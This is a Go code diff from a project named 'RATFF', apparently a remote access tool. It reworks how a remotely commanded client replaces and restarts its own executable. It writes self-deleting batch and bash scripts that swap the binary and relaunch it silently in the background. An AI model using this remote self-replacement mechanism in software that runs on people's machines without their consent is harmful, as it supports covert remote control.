@@ -5,7 +5,6 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
-	"syscall"
 
 	"RATFF/shared"
 )
@@ -85,15 +84,26 @@ func handleServiceUpdate(msg shared.Message) shared.Message {
 
 // handleExecutableUpdate replaces the current executable and restarts the service.
 func handleExecutableUpdate(clientID, tempPath, exePath string) shared.Message {
+	// Send success response BEFORE replacing the executable,
+	// because after replacement the process will be gone and cannot respond.
+	response := shared.NewMessage(shared.MsgResponse, shared.CmdServiceUpdate, clientID,
+		map[string]interface{}{"status": "updating", "exe_path": exePath})
+
 	switch runtime.GOOS {
 	case "windows":
-		return restartWithBatchScript(clientID, tempPath, exePath)
+		go func() {
+			restartWithBatchScript(clientID, tempPath, exePath)
+		}()
 	case "linux", "darwin":
-		return restartWithUnixMethod(clientID, tempPath, exePath)
+		go func() {
+			restartWithUnixMethod(clientID, tempPath, exePath)
+		}()
 	default:
 		return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, clientID,
 			map[string]interface{}{"error": fmt.Sprintf("unsupported OS: %s", runtime.GOOS)})
 	}
+
+	return response
 }
 
 // restartWithBatchScript handles Windows update using a batch script for delayed replacement.
@@ -115,6 +125,7 @@ del "%%~f0"
 
 	cmd := exec.Command("cmd", "/C", "start", "/B", batPath)
 	if err := cmd.Start(); err != nil {
+		os.Remove(batPath)
 		return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, clientID,
 			map[string]interface{}{"error": fmt.Sprintf("start batch script failed: %v", err)})
 	}
@@ -123,25 +134,40 @@ del "%%~f0"
 	return shared.Message{}
 }
 
-// restartWithUnixMethod handles Unix update using direct replacement and exec.
+// restartWithUnixMethod handles Unix update using a shell script for reliable replacement.
 func restartWithUnixMethod(clientID, tempPath, exePath string) shared.Message {
-	if err := os.Chmod(tempPath, 0755); err != nil {
-		return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, clientID,
-			map[string]interface{}{"error": fmt.Sprintf("chmod failed: %v", err)})
-	}
+	scriptPath := exePath + ".update.sh"
 
-	if err := os.Rename(tempPath, exePath); err != nil {
-		if copyErr := copyFile(tempPath, exePath); copyErr != nil {
-			return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, clientID,
-				map[string]interface{}{"error": fmt.Sprintf("replace executable failed: %v", copyErr)})
+	argsStr := ""
+	for i, arg := range os.Args {
+		if i > 0 {
+			argsStr += " " + arg
 		}
 	}
 
-	if err := syscall.Exec(exePath, os.Args, os.Environ()); err != nil {
-		cmd := exec.Command(exePath, os.Args[1:]...)
-		cmd.Start()
-		os.Exit(0)
+	scriptContent := fmt.Sprintf(`#!/bin/bash
+sleep 2
+rm -f "%s"
+mv -f "%s" "%s"
+chmod +x "%s"
+nohup "%s"%s > /dev/null 2>&1 &
+rm -f "$0"
+`, exePath, tempPath, exePath, exePath, exePath, argsStr)
+
+	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0755); err != nil {
+		os.Remove(tempPath)
+		return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, clientID,
+			map[string]interface{}{"error": fmt.Sprintf("create update script failed: %v", err)})
 	}
 
+	cmd := exec.Command("bash", scriptPath)
+	if err := cmd.Start(); err != nil {
+		os.Remove(scriptPath)
+		os.Remove(tempPath)
+		return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, clientID,
+			map[string]interface{}{"error": fmt.Sprintf("start update script failed: %v", err)})
+	}
+
+	os.Exit(0)
 	return shared.Message{}
 }
